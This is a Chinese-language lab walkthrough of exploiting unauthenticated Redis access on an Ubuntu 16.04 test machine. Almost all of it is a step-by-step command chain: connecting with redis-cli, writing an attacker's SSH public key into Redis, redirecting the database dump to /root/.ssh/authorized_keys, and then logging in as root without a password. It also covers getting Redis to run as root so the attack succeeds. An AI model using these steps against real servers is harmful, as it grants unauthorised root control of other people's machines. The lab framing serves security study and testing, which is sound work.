# redis未授权访问

## 漏洞证明

安装redis服务

`apt install redis-tools`

访问redis服务

`redis-cli -h ip [-p 6379]`

![image-20210625152251553](.\images\image1.png)

## 测试环境

靶机：ubuntu 16.04

## 漏洞利用

#### SSH免密登陆（redis必须以root身份安装）

#### 生成ssh公钥/私钥

`ssh-keygen -t rsa -C "hack"`

![image-20210625180331909](.\images\image2.png)

![image-20210625180435209](.\images\image3.png)

#### 将生成的公钥写入文件中

`(echo -e "\n\n\n"; cat id_rsa.pub; echo -e "\n\n\n") > hack.txt`

![image-20210629170844032](.\images\image4.png)

#### 将hack.txt写入靶机

`cat hack.txt| redis-cli -h 192.168.5.135 -x set crack`



![image-20210629171115871](.\images\image5.png)

#### 查看redis备份文件路径

`config get dir`

#### 修改靶机redis备份路径

`config set dir /root/.ssh`

![image-20210701152616766](.\images\image7.png)

![image-20210701160625010](.\images\image8.png)

说明redis不是以root用户启动

解决办法

1）网上下载redis包并make编译安装，在安装目录下执行以下命令

`./redis-server`

2）在redis-server文件所在位置启动redis

`/usr/bin/redis-server`

![image-20210701160709356](.\images\image9.png)

![image-20210701160922771](.\images\image10.png)

#### 修改备份路径成功

![image-20210701161720971](.\images\image11.png)

#### 设置上传公钥的备份文件名为authorized_keys

`config set dbfilename authorized_keys`

![image-20210701164324402](.\images\image12.png)

#### ssh免密连接

`ssh -i id_rsa root@192.168.5.135`

![image-20210701165622742](.\images\image13.png)
